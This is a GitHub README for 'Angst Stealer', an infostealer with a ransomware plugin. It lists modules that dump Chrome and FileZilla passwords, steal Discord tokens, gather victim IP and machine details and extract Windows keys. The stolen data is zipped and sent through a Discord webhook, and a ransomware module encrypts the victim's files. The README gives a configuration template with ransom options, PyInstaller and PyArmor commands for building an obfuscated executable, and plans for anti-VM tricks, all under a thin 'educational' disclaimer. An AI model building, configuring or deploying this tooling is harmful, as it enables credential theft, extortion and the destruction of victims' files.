## Angst Stealer
AngstStealer is a POC malware which is designed to highlight and utilize Discord as an attack vector. While it is fully functioning it was created for educational purpose's, please do not use misuse this tool. Angst Stealer currently has a total of 6 plugins:

|Plugin |Description |
|------ |----------- |
|Chrome | The chrome plugin dumps all of the users passwords, websites, and usernames. |
|Filezilla | Checks to see if the user has Filezilla installed, if they do then it dumps stored Filezilla creds. |
| Ransomware | Encrypts all files on the victims computer, drops a note also. |
| Discord | Dumps discord token for Chrome and Discord. |
| Send | Zips and sends all the files through the Discord webhook. |
| User | Drops userdata about the victim such as IP, Username and Computername. |
| Windows | Also drops the windows activation key for the victims computer. |

### Setup
1. Install python [here](https://www.python.org/ftp/python/3.7.7/python-3.7.7-amd64.exe)
2. Clone this repo using `git clone https://github.com/backslash/AngstStealer` or manually download it.
3. Run `cd folderpath` so that you are inside the directory itself.
4. Install the required libraries using `pip install -r requirements.txt`
5. Inside the main file you will see a config template, modify it so it matches your requirements.
```
CONFIG = {
    "webhook" : "",
    "chrome" : True,
    "filezilla":False,
    "userdata":True,
    "discord":True,
    "ransomware" : {
        "enabled" : False,
        "target_dir" : "C:\\Users\\testuser", #remove the testuser at the end
        "extenstion" : ".angst",
        "btcAddy" : "",
        "email" : "demo.tmpacc12@gmail.com"
    }
}
```
webhook -> The discord webhook link which you want it to use. </br>
chrome -> If it should include chrome passwords </br>
filezilla -> Should it include possible saved filezilla passwords</br>
userdata -> Give information about your victim </br>
discord -> Steal discord tokens</br>
ransomware -> If enabled is set to `True` then have enabled the ransomware module. The target_dir is the directory in which you want it to encrypt. The ransomware extenstion setting just sets the output file extenstion, in this case its just `.angst`. The btcAddy and email are just options which you can toss in to be included in the ransomware note.</br>
6. Run one of the following commands listed below, it is worth noting that pyarmor will sometimes corrupt the executable so if you plan on using the pyarmor command you should test it locally to make sure it works.</br>
`PYINSTALLER: pyinstaller --onefile --hidden-import=pkg_resources.py2_warn angst.py`</br>
`PYARMOR: pyarmor pack -e " --onefile --hidden-import=pkg_resources.py2_warn" angst.py`</br>

### Demo
Here is a screenshot of what will be sent through the discord webhook once it is ran. The reason why not windows activation key is included is due to it being run inside a virtual machine thats not activated.
<p align="center">
  <img width="560" height="300" src="https://botting.is-ne.at/H5OJTL.png">
</p>

### To Do List
- [ ] Add cookie support (just got lazy and forgot)
- [ ] Add more browsers
- [ ] Implement some anti-vm tricks.
- [ ] Add more plugins

If you would like to help with something, writing plugins for Angst would be a pretty big help.

### Additional
Use this responsibly, I made this just as a demonstration of a POC. The fact that Discord still hasn't implemented any safegaurds or preventive measures when it comes to something like this is kind've embarrasing. Regardless though, using this without the consent of the computer owner is illegal.
